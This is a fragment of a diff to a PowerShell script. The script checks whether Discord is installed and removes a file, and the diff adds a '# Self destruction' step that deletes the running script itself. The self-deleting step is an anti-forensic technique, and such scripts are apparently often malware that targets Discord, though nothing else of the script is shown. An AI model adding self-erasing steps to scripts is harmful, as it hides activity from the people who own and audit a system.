@@ -128,3 +128,7 @@ if (IsInstalled -appName "Discord"){
         Remove-Item $filename
     }
 }
+
+
+# Self destruction
+Remove-Item -Path $MyInvocation.MyCommand.Source
